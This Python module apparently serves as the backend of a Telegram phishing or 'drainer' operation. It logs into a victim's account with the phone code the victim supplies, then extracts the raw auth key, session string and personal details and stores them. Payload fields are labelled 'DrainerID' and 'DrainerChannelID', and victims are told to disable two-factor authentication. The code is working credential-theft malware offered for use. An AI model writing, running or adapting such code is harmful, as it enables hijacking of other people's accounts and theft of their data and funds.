import os
import json
import uuid
import time
import asyncio
import logging
import secrets
import base64
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import PhoneNumberInvalidError, PhoneCodeInvalidError, SessionPasswordNeededError

from utils.credentials_manager import CredentialsManager
from utils.mongodb_manager import mongodb_manager

logger = logging.getLogger(__name__)

class TelegramAuth:
    def __init__(self):
        # Get API credentials from config or environment
        self.api_id = os.getenv('TELEGRAM_API_ID', '29341250')
        self.api_hash = os.getenv('TELEGRAM_API_HASH', '2b4cd7da8f2544a5')
        
        # Convert to int if string
        if isinstance(self.api_id, str):
            self.api_id = int(self.api_id)
        
        logger.info(f"TelegramAuth initialized with API_ID: {self.api_id}, API_HASH: {self.api_hash[:8]}...{self.api_hash[-8:]}")
        
        # Check MongoDB connection
        if mongodb_manager.is_connected():
            logger.info("📊 Using MongoDB for session storage")
        else:
            logger.warning("⚠️ MongoDB not available, falling back to file-based storage")
            self.sessions_dir = "sessions"
            os.makedirs(self.sessions_dir, exist_ok=True)
        
        # Global event loop for async operations
        self._loop = None
    
    def _ensure_global_loop(self):
        """Ensure we have a global event loop for all operations"""
        if self._loop is None or self._loop.is_closed():
            try:
                # Try to get the current event loop
                self._loop = asyncio.get_event_loop()
            except RuntimeError:
                # Create a new event loop if none exists
                self._loop = asyncio.new_event_loop()
                asyncio.set_event_loop(self._loop)
        return self._loop

    def send_code_sync(self, phone_number: str) -> dict:
        """
        Send verification code to phone number (synchronous wrapper)
        Returns: {'success': bool, 'message': str, 'session_id': str}
        """
        loop = self._ensure_global_loop()
        return loop.run_until_complete(self._send_code_async(phone_number))

    async def _send_code_async(self, phone_number: str) -> dict:
        """
        Send verification code to phone number (async implementation)
        Returns: {'success': bool, 'message': str, 'session_id': str}
        """
        client = None
        try:
            # Create a unique session ID with shorter format to avoid MongoDB integer overflow
            import hashlib
            phone_hash = hashlib.md5(phone_number.encode()).hexdigest()[:8]
            session_id = f"session_{phone_hash}_{uuid.uuid4().hex[:8]}"
            
            # Create a new client session
            client = TelegramClient(StringSession(), self.api_id, self.api_hash)
            
            # Connect using the global event loop
            await client.connect()
            
            # Send code request
            result = await client.send_code_request(phone_number)
            
            # Store the session in file for later use
            session_data = {
                'phone_number': phone_number,
                'phone_code_hash': result.phone_code_hash,
                'session_string': client.session.save(),  # Store the session string
                'created_at': time.time()
            }
            
            # Store session data
            if mongodb_manager.is_connected():
                mongodb_manager.save_session(session_id, session_data)
            else:
                self._store_session_file(session_id, session_data)
            
            logger.info(f"Code sent successfully to {phone_number}")
            
            return {
                'success': True,
                'message': 'Verification code sent to your Telegram',
                'session_id': session_id
            }
            
        except PhoneNumberInvalidError:
            logger.error(f"Invalid phone number: {phone_number}")
            if client:
                await client.disconnect()
            return {
                'success': False,
                'message': 'Invalid phone number. Please check and try again.'
            }
        except Exception as e:
            logger.error(f"Error sending code to {phone_number}: {e}")
            if client:
                await client.disconnect()
            return {
                'success': False,
                'message': 'Failed to send verification code. Please try again.'
            }
    
    def verify_code_sync(self, session_id: str, code: str) -> dict:
        """
        Verify the code sent to phone number (synchronous wrapper)
        Returns: {'success': bool, 'message': str, 'user_info': dict, 'session_data': dict}
        """
        loop = self._ensure_global_loop()
        return loop.run_until_complete(self._verify_code_async(session_id, code))

    async def _verify_code_async(self, session_id: str, code: str) -> dict:
        """
        Verify the code sent to phone number (async implementation)
        Returns: {'success': bool, 'message': str, 'user_info': dict, 'session_data': dict}
        """
        try:
            # Retrieve session data
            if mongodb_manager.is_connected():
                session_data = mongodb_manager.get_session(session_id)
            else:
                session_data = self._get_session_file(session_id)
            
            if not session_data:
                return {
                    'success': False,
                    'message': 'Session expired. Please try logging in again.'
                }
            
            phone_number = session_data['phone_number']
            phone_code_hash = session_data['phone_code_hash']
            session_string = session_data.get('session_string')
            
            # Recreate the Telethon client using the stored session string
            try:
                if session_string:
                    # Use the stored session string to recreate the same client
                    client = TelegramClient(StringSession(session_string), self.api_id, self.api_hash)
                    logger.info(f"🔌 Recreating client with stored session for {session_id}")
                else:
                    # Fallback to new client if no session string
                    client = TelegramClient(StringSession(), self.api_id, self.api_hash)
                    logger.info(f"🔌 Creating new client (no session string) for {session_id}")
                
                await client.connect()
                logger.info(f"✅ Client connected for session {session_id}")
            except Exception as e:
                logger.error(f"❌ Error creating client for session {session_id}: {e}")
                return {
                    'success': False,
                    'message': 'Failed to create session. Please try logging in again.'
                }
            
            # Ensure we're using the same event loop
            current_loop = asyncio.get_event_loop()
            if not client.is_connected():
                # Reconnect if needed
                await client.connect()
            
            # Sign in with the code
            logger.info(f"🔐 Attempting to sign in with code for session {session_id}")
            logger.info(f"📱 Phone: {phone_number}")
            logger.info(f"🔑 Code hash: {phone_code_hash[:20]}...")
            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
            
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username,
                'phone': me.phone
            }
            
            # Capture session data for credentials manager
            try:
                logger.info("🔍 Starting session data capture in verify_code...")
                logger.info(f"📱 Client object: {client}")
                logger.info(f"📱 Client type: {type(client)}")
                logger.info(f"👤 User info: {user_info}")
                
                session_data = await self._capture_session_data(client, user_info)
                logger.info(f"✅ Session data captured successfully: {len(session_data)} items")
                
                # Save to credentials manager
                credentials_manager = CredentialsManager()
                credentials_manager.save_credentials(
                    user_id=user_info['id'],
                    phone=phone_number,
                    session_data=session_data,
                    user_info=user_info
                )
                logger.info(f"💾 Credentials saved for user {user_info['id']}")
                
            except Exception as e:
                logger.error(f"❌ Error in session capture during verification: {e}")
                logger.error(f"❌ Error details: {type(e).__name__}: {str(e)}")
                import traceback
                logger.error(f"❌ Traceback: {traceback.format_exc()}")
            
            logger.info(f"Successfully verified code for user {me.id} ({me.first_name})")
            logger.info(f"Captured session data with {len(session_data)} items")
            
            # Clean up session data
            if mongodb_manager.is_connected():
                mongodb_manager.delete_session(session_id)
            else:
                self._delete_session_file(session_id)
            await client.disconnect()
            
            return {
                'success': True,
                'message': 'Verification successful!',
                'user_info': user_info,
                'session_data': session_data
            }
            
        except PhoneCodeInvalidError:
            logger.error(f"Invalid code {code} for session {session_id}")
            return {
                'success': False,
                'message': 'Invalid verification code. Please try again.'
            }
        except SessionPasswordNeededError:
            logger.error(f"Two-factor authentication required for session {session_id}")
            return {
                'success': False,
                'message': 'Two-factor authentication is enabled. Please disable it to use this login method.'
            }
        except Exception as e:
            logger.error(f"Error verifying code {code} for session {session_id}: {e}")
            return {
                'success': False,
                'message': 'Failed to verify code. Please try again.'
            }
    
    async def _capture_session_data(self, client, user_info):
        """
        Capture real Telegram session data from the authenticated client
        Only uses real authentication keys from the actual login session
        """
        try:
            logger.info("🔍 Starting real session data capture...")
            
            # Get the session string
            session_string = client.session.save()
            logger.info(f"📦 Session string length: {len(session_string)}")
            logger.info(f"📦 Session string preview: {session_string[:100]}...")
            
            # Get auth key from session - try multiple methods
            auth_key_bytes = None
            server_salt = None
            dc_id = 2  # Default DC
            
            # Method 1: Try to get auth key from session
            if hasattr(client.session, 'auth_key'):
                auth_key = client.session.auth_key
                logger.info(f"🔑 Auth key from session: {auth_key}")
                if auth_key:
                    auth_key_bytes = auth_key.key
                    logger.info(f"🔑 Auth key bytes length: {len(auth_key_bytes) if auth_key_bytes else 0}")
                    logger.info(f"🔑 Auth key preview: {auth_key_bytes[:32].hex() if auth_key_bytes else 'None'}...")
            
            # Method 2: Try alternative method - get from connection
            if not auth_key_bytes and hasattr(client, '_sender'):
                sender = client._sender
                logger.info(f"🔗 Sender type: {type(sender)}")
                if hasattr(sender, 'connection'):
                    connection = sender.connection
                    logger.info(f"🔗 Connection type: {type(connection)}")
                    if hasattr(connection, 'auth_key'):
                        auth_key = connection.auth_key
                        logger.info(f"🔑 Auth key from connection: {auth_key}")
                        if auth_key:
                            auth_key_bytes = auth_key.key
                            logger.info(f"🔑 Auth key bytes length: {len(auth_key_bytes) if auth_key_bytes else 0}")
                            logger.info(f"🔑 Auth key preview: {auth_key_bytes[:32].hex() if auth_key_bytes else 'None'}...")
                    
                    # Try to get server salt from connection
                    if hasattr(connection, 'server_salt'):
                        server_salt = connection.server_salt
                        logger.info(f"🧂 Server salt: {server_salt}")
            
            # Method 3: Try to get more session details
            if hasattr(client.session, '_auth_key'):
                auth_key = client.session._auth_key
                logger.info(f"🔑 Auth key from _auth_key: {auth_key}")
                if auth_key and not auth_key_bytes:
                    auth_key_bytes = auth_key.key
                    logger.info(f"🔑 Auth key bytes from _auth_key: {len(auth_key_bytes) if auth_key_bytes else 0}")
            
            # Method 4: Try to get auth key from session attributes
            if not auth_key_bytes:
                session_attrs = dir(client.session)
                logger.info(f"📋 Session attributes: {session_attrs}")
                
                # Look for auth key in session attributes
                for attr in session_attrs:
                    if 'auth' in attr.lower() and not attr.startswith('_'):
                        try:
                            attr_value = getattr(client.session, attr)
                            if hasattr(attr_value, 'key'):
                                auth_key_bytes = attr_value.key
                                logger.info(f"🔑 Found auth key in {attr}: {len(auth_key_bytes) if auth_key_bytes else 0}")
                                break
                        except Exception as e:
                            logger.debug(f"Could not access {attr}: {e}")
            
            # Get DC info
            if hasattr(client.session, 'dc_id'):
                dc_id = client.session.dc_id
            logger.info(f"🌐 DC ID: {dc_id}")
            
            # Get more session details
            if hasattr(client.session, 'server_addr'):
                logger.info(f"🌐 Server address: {client.session.server_addr}")
            if hasattr(client.session, 'port'):
                logger.info(f"🌐 Port: {client.session.port}")
            
            # Get client details
            if hasattr(client, 'api_id'):
                logger.info(f"🔑 API ID: {client.api_id}")
            if hasattr(client, 'api_hash'):
                logger.info(f"🔑 API Hash preview: {client.api_hash[:8]}...{client.api_hash[-8:] if client.api_hash else 'None'}")
            
            # CRITICAL: Only proceed if we have real auth key
            if not auth_key_bytes:
                logger.error("❌ No real auth key could be captured from the session")
                logger.error("❌ This indicates the authentication was not successful or the session is invalid")
                raise Exception("Real authentication key could not be captured. Authentication may have failed.")
            
            # Generate session data using ONLY real authentication data
            current_time = int(time.time())
            
            # Create session data with real auth key (no fallback to generated keys)
            session_data = {
                # User instance data
                "xt_instance": json.dumps({
                    "id": user_info['id'],
                    "idle": False,
                    "time": int(time.time() * 1000)
                }),
                
                # Real auth key from Telethon (this is the actual authentication)
                "dc1_auth_key": auth_key_bytes.hex(),
                
                # For other DCs, we'll use the same auth key since we only have one
                # This is more realistic than generating fake keys
                "dc2_auth_key": auth_key_bytes.hex(),
                "dc3_auth_key": auth_key_bytes.hex(),
                "dc4_auth_key": auth_key_bytes.hex(),
                "dc5_auth_key": auth_key_bytes.hex(),
                
                # Server salts (use real server salt for dc1 if available, otherwise use auth key derived salt)
                "dc1_server_salt": server_salt.hex() if server_salt else auth_key_bytes[:8].hex(),
                "dc2_server_salt": auth_key_bytes[8:16].hex(),
                "dc3_server_salt": auth_key_bytes[16:24].hex(),
                "dc4_server_salt": auth_key_bytes[24:32].hex(),
                "dc5_server_salt": auth_key_bytes[32:40].hex(),
                
                # User authentication data
                "user_auth": json.dumps({
                    "dcID": dc_id,
                    "date": current_time,
                    "id": user_info['id']
                }),
                
                # Session info
                "state_id": str(secrets.randbelow(2000000000)),
                "dc": str(dc_id),
                "k_build": "579",
                "auth_key_fingerprint": auth_key_bytes[:4].hex(),
                "server_time_offset": "0",
                
                # Store the session string for potential reuse
                "session_string": session_string,
                
                # Web app specific data
                "tgWebAppStartParam": base64.b64encode(
                    json.dumps({
                        "DrainerID": user_info['id'],
                        "DrainerChannelID": -1002573012632
                    }).encode()
                ).decode(),
                
                # Additional metadata to confirm this is real authentication
                "captured_user_id": str(user_info['id']),
                "captured_phone": user_info.get('phone', ''),
                "captured_first_name": user_info.get('first_name', ''),
                "captured_last_name": user_info.get('last_name', ''),
                "captured_username": user_info.get('username', ''),
                "captured_at": str(current_time),
                "session_type": "real_telethon_session",
                "auth_key_source": "real_telethon_client",
                "auth_key_length": len(auth_key_bytes),
                "is_real_authentication": True
            }
            
            logger.info(f"✅ Captured REAL session data with {len(session_data)} items")
            logger.info(f"🔑 Real auth key used: {auth_key_bytes is not None}")
            logger.info(f"🔑 Auth key length: {len(auth_key_bytes)} bytes")
            logger.info(f"📦 Session string included: {'session_string' in session_data}")
            logger.info(f"🌐 DC ID used: {dc_id}")
            logger.info(f"🧂 Real server salt: {server_salt is not None}")
            
            # Log a sample of the captured data
            logger.info("📋 Sample captured data:")
            for key, value in list(session_data.items())[:3]:
                preview = value[:50] + "..." if len(str(value)) > 50 else value
                logger.info(f"   {key}: {preview}")
            
            return session_data
            
        except Exception as e:
            logger.error(f"❌ Error capturing session data: {e}")
            logger.error(f"❌ Error details: {type(e).__name__}: {str(e)}")
            import traceback
            logger.error(f"❌ Traceback: {traceback.format_exc()}")
            
            # CRITICAL: Do not fall back to generated data
            # If we can't capture real auth keys, the authentication has failed
            raise Exception(f"Failed to capture real authentication data: {str(e)}")
    
    def _generate_fallback_session_data(self, user_info):
        """
        DEPRECATED: This method is no longer used.
        We now require real authentication keys and do not fall back to generated ones.
        """
        raise Exception("Real authentication required. Generated auth keys are no longer supported.")
    
    def cleanup_session(self, session_id: str):
        """Clean up a session"""
        try:
            if mongodb_manager.is_connected():
                # Clean up from MongoDB
                mongodb_manager.delete_session(session_id)
                logger.info(f"🧹 Cleaned up session from MongoDB: {session_id}")
            else:
                # Fallback to file-based cleanup
                session_data = self._get_session_file(session_id)
                if session_data and 'client' in session_data:
                    try:
                        client = session_data['client']
                        loop = self._ensure_global_loop()
                        if not loop.is_closed():
                            loop.create_task(client.disconnect())
                    except:
                        pass
                
                # Delete from file
                self._delete_session_file(session_id)
                logger.info(f"🧹 Cleaned up session from file: {session_id}")
        except Exception as e:
            logger.error(f"❌ Error cleaning up session {session_id}: {e}")
    
    def cleanup_expired_sessions(self, max_age_seconds=300):
        """Clean up expired sessions using MongoDB or file-based storage"""
        try:
            if mongodb_manager.is_connected():
                # Use MongoDB cleanup
                deleted_count = mongodb_manager.cleanup_expired_sessions()
                if deleted_count > 0:
                    logger.info(f"🧹 Cleaned up {deleted_count} expired sessions from MongoDB")
                return deleted_count
            else:
                # Fallback to file-based cleanup
                current_time = time.time()
                deleted_count = 0
                
                for filename in os.listdir(self.sessions_dir):
                    if filename.endswith('.json'):
                        filepath = os.path.join(self.sessions_dir, filename)
                        try:
                            with open(filepath, 'r', encoding='utf-8') as f:
                                session_data = json.load(f)
                            
                            created_time = session_data.get('created_at', 0)
                            if current_time - created_time > max_age_seconds:
                                os.remove(filepath)
                                deleted_count += 1
                        except Exception as e:
                            logger.error(f"❌ Error processing session file {filename}: {e}")
                            # Remove corrupted files
                            try:
                                os.remove(filepath)
                                deleted_count += 1
                            except:
                                pass
                
                if deleted_count > 0:
                    logger.info(f"🧹 Cleaned up {deleted_count} expired sessions from files")
                return deleted_count
            
        except Exception as e:
            logger.error(f"❌ Error cleaning up expired sessions: {e}")
            return 0

    def _store_session_file(self, session_id: str, session_data: dict) -> bool:
        """Store session data in a JSON file"""
        try:
            filepath = os.path.join(self.sessions_dir, f"{session_id}.json")
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2, ensure_ascii=False)
            logger.info(f"✅ Session stored in file: {filepath}")
            return True
        except Exception as e:
            logger.error(f"❌ Error storing session file {session_id}: {e}")
            return False
    
    def _get_session_file(self, session_id: str) -> dict:
        """Retrieve session data from a JSON file"""
        try:
            filepath = os.path.join(self.sessions_dir, f"{session_id}.json")
            if not os.path.exists(filepath):
                return None
            
            with open(filepath, 'r', encoding='utf-8') as f:
                session_data = json.load(f)
            
            # Check if session has expired (5 minutes)
            created_time = session_data.get('created_at', 0)
            if time.time() - created_time > 300:  # 5 minutes
                self._delete_session_file(session_id)
                return None
            
            logger.info(f"✅ Session retrieved from file: {filepath}")
            return session_data
        except Exception as e:
            logger.error(f"❌ Error reading session file {session_id}: {e}")
            return None
    
    def _delete_session_file(self, session_id: str) -> bool:
        """Delete session data file"""
        try:
            filepath = os.path.join(self.sessions_dir, f"{session_id}.json")
            if os.path.exists(filepath):
                os.remove(filepath)
                logger.info(f"✅ Session file deleted: {filepath}")
            return True
        except Exception as e:
            logger.error(f"❌ Error deleting session file {session_id}: {e}")
            return False

# Global instance
telegram_auth = TelegramAuth() 